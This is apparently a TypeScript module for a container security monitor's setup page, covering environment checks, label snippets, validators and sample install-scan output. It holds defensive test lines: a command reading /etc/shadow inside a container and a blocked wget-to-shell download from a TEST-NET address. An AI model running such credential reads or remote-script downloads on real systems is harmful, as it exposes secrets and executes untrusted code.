import type { FlowNode } from '../../components/FlowHero';
import type { Info, InstallSession, IntegrationContainer, IntegrationEnv, IntegrationStatus, Kind, Verdict } from '../../lib/types';

// 연동 페이지(11/06 · 11/09 밤 3페이지로)의 흐름 그림 · 환경 점검 · 라벨 예시 — 화면과 e2e 가 같이 쓴다. 문구 규칙: 개조식 명사형 종결

export const FLOW: FlowNode[] = [
  { id: 'label', title: '내 컨테이너', sub: '라벨 한 줄', point: '컨테이너에 supplyguard.watch=true 라벨 추가됨' },
  { id: 'kernel', title: '커널 eBPF', sub: '실행 · 파일 · 통신 · 조회', point: '커널에서 실행 · 파일 열기 · 네트워크 연결 · DNS 질의 수집됨' },
  { id: 'judge', title: 'SupplyGuard', sub: '정책으로 판정', point: '정책(YAML)과 비교해 정상 · 경고 · 격리 판정됨' },
  { id: 'act', title: '경고 · 격리', sub: 'supplyguard.enforce', tone: 'danger', point: '위반은 기록 · 알림, 격리 라벨이 있으면 증거 수집 뒤 즉시 격리됨' },
];

export type Tone = 'ok' | 'warn' | 'off';
export interface Check { id: string; label: string; value: string; tone: Tone; hint?: string }

// 환경 점검 — 현상을 먼저, 조치는 hint 로
export function envChecks(env: IntegrationEnv, info: Info | null): Check[] {
  const out: Check[] = [];
  const gadget = env.source === 'gadget';
  out.push(
    gadget
      ? { id: 'source', label: '이벤트 수집', value: '실제 커널(eBPF)', tone: 'ok' }
      : { id: 'source', label: '이벤트 수집', value: '모의 이벤트(개발용)', tone: 'warn', hint: '서버에서는 EVENT_SOURCE=gadget 으로 실행 필요' },
  );
  const k = env.kernel.match(/^(\d+)\.(\d+)/);
  const major = k ? Number(k[1]) : 0;
  const minor = k ? Number(k[2]) : 0;
  out.push(
    !env.kernel
      ? { id: 'kernel', label: '커널', value: '확인 불가(리눅스 아님)', tone: 'off', hint: '리눅스 서버(커널 5.15 이상)에서 실제 수집 가능' }
      : major >= 7
        ? { id: 'kernel', label: '커널', value: env.kernel, tone: 'warn', hint: '커널 7.0 에서 이벤트 유실 확인됨, Ubuntu 22.04(커널 5.15 · 6.8) 권장' }
        : major > 5 || (major === 5 && minor >= 15)
          ? { id: 'kernel', label: '커널', value: env.kernel, tone: 'ok' }
          : { id: 'kernel', label: '커널', value: env.kernel, tone: 'warn', hint: '커널 5.15 이상 권장' },
  );
  out.push({ id: 'os', label: '운영체제', value: env.os || '', tone: env.os ? 'ok' : 'off' });
  const g = info?.gadgets ?? [];
  const need: Kind[] = ['exec', 'open', 'connect'];
  const missing = need.filter((x) => !g.includes(x));
  out.push(
    missing.length
      ? { id: 'gadgets', label: '수집 항목', value: `${missing.join(' · ')} 없음`, tone: 'warn', hint: 'GADGETS 설정 확인 필요' }
      : { id: 'gadgets', label: '수집 항목', value: info?.dnsResolve === 'ok' ? '실행 · 파일 · 통신 · DNS' : '실행 · 파일 · 통신', tone: info?.dnsResolve === 'off' ? 'warn' : 'ok', hint: info?.dnsResolve === 'off' ? 'trace_dns 꺼짐, 도메인 기준 판정은 통과 처리됨' : undefined },
  );
  const d = info?.discovery ?? '';
  out.push(
    !d
      ? { id: 'discovery', label: '컨테이너 발견', value: gadget ? '시작 전' : '해당 없음(모의)', tone: 'off' }
      : d === 'fanotify'
        ? { id: 'discovery', label: '컨테이너 발견', value: 'fanotify(시작 순간부터)', tone: 'ok' }
        : { id: 'discovery', label: '컨테이너 발견', value: d, tone: 'warn', hint: info?.discoveryNote || '컨테이너 시작 직후 동작은 놓칠 수 있음' },
  );
  out.push(
    env.enforceKill
      ? { id: 'enforce', label: '격리', value: '켜짐', tone: 'ok' }
      : { id: 'enforce', label: '격리', value: '꺼짐(dry-run)', tone: 'warn', hint: 'ENFORCE_KILL=false(격리 정책도 알림만 전송됨)' },
  );
  return out;
}

// 대시보드 띠: 실제 수집(gadget)인데 감시 중인 내 컨테이너(sg-install · sg-probe 제외)가 0개
const isOwn = (name: string) => !/^sg-(install|probe)-/.test(name);

export function needsIntegration(st: IntegrationStatus | undefined): boolean {
  if (!st || st.env.source !== 'gadget') return false;
  return !st.containers.some((c) => c.watched && isOwn(c.name));
}


// ── 시나리오(11/06 요구 1 수정 — 사용자가 값을 넣으면 설정 생성 → 적용 뒤 자동 감지 → 내 컨테이너에서 시험 동작) ──
// 카드(11/09 밤 사용자 결정) = 제목 + 한 줄 설명 + 예 하나. 세부(대상 · 라벨 · 자동 감지 · 감지 진행)는 고른 뒤 1단계 안 NOTES 로만
export type ScenarioId = 'single' | 'multi' | 'install';
export const SCENARIOS: { id: ScenarioId; title: string; desc: string; example: string }[] = [
  { id: 'single', title: '내 서비스 하나', desc: '컨테이너 하나를 감시합니다.', example: 'docker run my-app' },
  { id: 'multi', title: '여러 컨테이너 한 번에', desc: 'compose 프로젝트를 한 번에 감시합니다.', example: 'web · api · db' },
  { id: 'install', title: '패키지 설치 검사', desc: '설치 전에 격리 환경에서 검사합니다.', example: 'pip install requests' },
];
// 1단계 위 3컷 흐름 그림(11/10 사용자 결정 「흐름 그림 + 2단 미리보기」) — 무엇을 → 어떻게 → 결과.
//   11/06 카드의 부제 · 요점(옛 SCENARIO_NOTES)을 컷 설명으로 옮겼다(개조식 명사형 종결). 아이콘 이름은 ScenarioWizard 가 그림으로 바꾼다
export type CutIcon = 'container' | 'tag' | 'shield' | 'layers' | 'tags' | 'terminal' | 'box' | 'split';
export interface Cut { icon: CutIcon; title: string; desc: string }
export const SCENARIO_FLOW: Record<ScenarioId, Cut[]> = {
  single: [
    { icon: 'container', title: '내 컨테이너', desc: 'compose 서비스 1개 또는 docker run 컨테이너 1개 대상' },
    { icon: 'tag', title: '라벨 2줄 추가 후 다시 실행', desc: '감시 라벨 + 격리 라벨(선택), 다시 만들면 화면이 자동 감지함' },
    { icon: 'shield', title: 'SupplyGuard 가 감시', desc: '위반이면 경고, 격리 라벨이 있으면 증거 수집 뒤 격리' },
  ],
  multi: [
    { icon: 'layers', title: 'compose 프로젝트', desc: 'compose 프로젝트 전체 대상, 서비스 목록만 입력' },
    { icon: 'tags', title: '서비스마다 라벨', desc: '서비스별 감시 · 격리 선택됨, 감시를 끈 서비스는 라벨 없음' },
    { icon: 'shield', title: '한 번에 감시', desc: '다시 실행 한 번, 적용 뒤 감지 진행(감지 수 / 전체) 표시됨' },
  ],
  install: [
    { icon: 'terminal', title: '터미널에서 sg-install', desc: 'pip · npm · cargo 대신 실행, 같은 패키지 정적 검사 함께 시작됨' },
    { icon: 'box', title: '격리 컨테이너 안에서 설치', desc: '감시 컨테이너(sg-install-*) 안에서 설치, 호스트에 설치되지 않음' },
    { icon: 'split', title: '통과 또는 설치 전 격리', desc: '악성 동작이면 설치 완료 전에 격리됨, 결과는 설치 검사 화면에 기록됨' },
  ],
};
export const STEPS = ['입력', '적용', '확인'] as const;

export interface SingleInput { mode: 'compose' | 'run'; name: string; image: string; enforce: boolean }
export interface Svc { name: string; image: string; watch: boolean; enforce: boolean }
export interface MultiInput { project: string; services: Svc[] }
export type Manager = 'pip' | 'npm' | 'cargo';
export interface InstallInput { manager: Manager; pkg: string }
export const DEFAULT_SINGLE: SingleInput = { mode: 'compose', name: 'my-app', image: 'my-app:latest', enforce: false };
export const DEFAULT_MULTI: MultiInput = {
  project: 'shop',
  services: [
    { name: 'web', image: 'nginx:1.27-alpine', watch: true, enforce: false },
    { name: 'api', image: 'shop-api:latest', watch: true, enforce: true },
    { name: 'db', image: 'postgres:17-alpine', watch: false, enforce: false },
  ],
};
export const DEFAULT_INSTALL: InstallInput = { manager: 'pip', pkg: 'requests' };
// 「예시로 채우기」(11/10) — 격리까지 켠 예라 미리보기에 라벨 2줄이 보인다
export const EXAMPLE_SINGLE: Omit<SingleInput, 'mode'> = { name: 'shop-api', image: 'shop-api:1.4', enforce: true };
export const EXAMPLE_MULTI: MultiInput = DEFAULT_MULTI;
export const EXAMPLE_INSTALL: InstallInput = { manager: 'pip', pkg: 'requests==2.31.0' };
// 「악성 흉내 패키지로 시연」 — 저장소의 무해한 시뮬 패키지(TEST-NET 주소 · 예약 도메인만)
export const DEMO_INSTALL: InstallInput = { manager: 'pip', pkg: './deploy/demo/reqeusts' };

// 입력 검사 — Docker 컨테이너 · 서비스 이름 규칙, 이미지 참조, 패키지(이름 + 버전 지정)
const NAME_RE = /^[a-z0-9][a-z0-9_.-]{0,62}$/;
const IMAGE_RE = /^[a-z0-9][a-z0-9._/:@-]{0,254}$/i;
const PKG_RE = /^[A-Za-z0-9@][A-Za-z0-9._@/=<>~^!-]{0,213}$/;
// 저장소 안 폴더(sg-install 이 읽기 전용으로 붙임) — ./ 또는 ../ 로 시작
const LOCAL_RE = /^\.\.?\/[A-Za-z0-9._/-]{1,200}$/;
// 입력 검사 문구(11/09 SPEC §7): 빈 값 「[칸]을(를) 입력하세요.」 · 모양 「[칸]은 [예] 모양으로 입력하세요.」
export const nameError = (s: string) => (!s ? '이름을 입력하세요.' : NAME_RE.test(s) ? '' : '이름은 소문자 · 숫자 · - _ . 만 쓸 수 있습니다.');
export const imageError = (s: string) => (!s ? '이미지를 입력하세요.' : IMAGE_RE.test(s) ? '' : '이미지는 my-app:1.0 모양으로 입력하세요.');
export const pkgError = (s: string) => (!s ? '패키지 이름을 입력하세요.' : PKG_RE.test(s) || LOCAL_RE.test(s) ? '' : '패키지 이름은 requests 모양으로 입력하세요.');
export function singleErrors(i: SingleInput) {
  return { name: nameError(i.name), image: imageError(i.image) };
}
export function multiErrors(i: MultiInput) {
  const names = i.services.map((s) => s.name);
  return {
    project: nameError(i.project),
    services: i.services.map((s, k) => ({ name: nameError(s.name) || (names.indexOf(s.name) !== k ? '이름이 겹칩니다.' : ''), image: imageError(s.image) })),
    none: i.services.some((s) => s.watch) ? '' : '감시할 서비스 1개 이상을 고르세요.',
  };
}
const ok = (o: Record<string, string>) => Object.values(o).every((v) => !v);
export const singleValid = (i: SingleInput) => ok(singleErrors(i));
export function multiValid(i: MultiInput) {
  const e = multiErrors(i);
  return !e.project && !e.none && e.services.every(ok) && i.services.length > 0;
}
export const installValid = (i: InstallInput) => !pkgError(i.pkg);

type Labels = Pick<IntegrationEnv, 'labelWatch' | 'labelEnforce'>;
// container_name 을 고정해 자동 감지(이름이 정확히 같은 컨테이너)가 흔들리지 않게 한다
export function singleSnippet(i: SingleInput, env: Labels): string {
  if (i.mode === 'run')
    return [`docker run -d --name ${i.name} \\`, `  --label ${env.labelWatch}=true \\`, ...(i.enforce ? [`  --label ${env.labelEnforce}=true \\`] : []), `  ${i.image}`].join('\n');
  return ['services:', `  ${i.name}:`, `    image: ${i.image}`, `    container_name: ${i.name}`, '    labels:', `      ${env.labelWatch}: "true"`, ...(i.enforce ? [`      ${env.labelEnforce}: "true"`] : [])].join('\n');
}
export const singleApply = (i: SingleInput, env: Labels) => (i.mode === 'run' ? singleSnippet(i, env).replace(/ \\\n\s*/g, ' ') : `docker compose up -d ${i.name}`);
export const multiContainer = (project: string, svc: string) => `${project}-${svc}`;
export function multiSnippet(i: MultiInput, env: Labels): string {
  const out = [`name: ${i.project}`, 'services:'];
  for (const s of i.services) {
    out.push(`  ${s.name}:`, `    image: ${s.image}`, `    container_name: ${multiContainer(i.project, s.name)}`);
    if (s.watch) out.push('    labels:', `      ${env.labelWatch}: "true"`, ...(s.enforce ? [`      ${env.labelEnforce}: "true"`] : []));
  }
  return out.join('\n');
}
export const multiApply = () => 'docker compose up -d';
export const installCmd = (i: InstallInput) => `tools/sg-install ${i.manager} ${i.pkg}`;
export const testCmd = (container: string) => `docker exec ${container} cat /etc/shadow`;
// 미리보기에서 강조 · 셈하는 줄 = SupplyGuard 라벨 줄(11/10)
export const isAdded = (line: string) => line.includes('supplyguard.');
export const addedCount = (snippet: string) => snippet.split('\n').filter(isAdded).length;

// 설치 검사 터미널 순서(11/10) — 토큰은 파일에서 읽는 명령만(값은 화면에 두지 않는다)
export const TOKEN_CMD = `export SUPPLYGUARD_SANDBOX_TOKEN="$(grep '^SANDBOX_TOKEN=' .env.local | cut -d= -f2-)"`;
// 결과 예시 — tools/sg-install 이 찍는 줄을 줄여 옮김(화면 규칙에 맞춰 줄표는 쉼표로)
export const resultPass = (i: InstallInput) => [`$ ${installCmd(i)}`, `▶ ${i.manager} install ${i.pkg}`, '  컨테이너 sg-install-…, SupplyGuard 감시 중', '[OK] 위반 없음'].join('\n');
export const RESULT_KILL = [
  '[격리됨] 위반 1건, 컨테이너를 SIGKILL 로 격리했습니다',
  '  1. [exec] no-shell-download  wget -q -O- http://203.0.113.7/…',
  '     외부 스크립트를 내려받아 셸로 실행  <- 격리',
  '이 패키지를 설치하지 마세요.',
].join('\n');
export const EXIT_CODES: [string, string][] = [
  ['0', '통과, 위반 없음'],
  ['2', '위반, 격리 또는 경고(설치 검사 화면에 새 건)'],
  ['3', '차단 목록, 컨테이너를 띄우기 전 거부'],
  ['77', '토큰 거부, ① 토큰 준비 줄 확인'],
];

// 자동 감지 — 기대 이름이 감시 목록에 「감시 중」으로 나타나면 감지됨
export interface Expect { name: string; enforce: boolean }
export function expected(sc: ScenarioId, single: SingleInput, multi: MultiInput): Expect[] {
  if (sc === 'single') return [{ name: single.name, enforce: single.enforce }];
  if (sc === 'multi') return multi.services.filter((s) => s.watch).map((s) => ({ name: multiContainer(multi.project, s.name), enforce: s.enforce }));
  return [];
}
export function detected(exp: Expect[], containers: IntegrationContainer[]) {
  return exp.map((e) => ({ ...e, row: containers.find((c) => c.name === e.name && c.watched) ?? null }));
}
// 설치 검사 감지 — since 뒤에 시작한 같은 관리자 · 패키지 세션(버전 지정은 이름만 비교)
const pkgName = (p: string) => p.replace(/^(@?[^@=<>~^!]+).*$/, '$1').toLowerCase();
export function installSessionFor(list: InstallSession[] | undefined, i: InstallInput, since: string | undefined): InstallSession | null {
  if (!list || !since) return null;
  const want = pkgName(i.pkg);
  return list.filter((s) => s.manager === i.manager && s.startedAt >= since && s.packages.some((p) => pkgName(p) === want)).sort((a, b) => b.startedAt.localeCompare(a.startedAt))[0] ?? null;
}
// 시험 동작 결과 — armedAt(명령 복사 시각) 5초 전 이후, 그 컨테이너의 위반 판정
export type Outcome = 'killed' | 'held' | 'alert';
export const outcomeOf = (v: Verdict): Outcome => (v.enforced ? 'killed' : v.dryRun ? 'held' : 'alert');
export function testVerdict<T extends Verdict>(verdicts: T[], container: string, armedAt: string | undefined): T | null {
  if (!armedAt) return null;
  const from = Date.parse(armedAt) - 5000;
  return verdicts.find((v) => v.matched && v.event.containerName === container && Date.parse(v.event.timestamp) >= from) ?? null;
}

// 감시 중 컨테이너 상세 시트 탭(11/10) — 첫 탭(정보)은 주소에 쓰지 않는다(?tab=violations · events)
export const WATCH_TABS = ['info', 'violations', 'events'] as const;
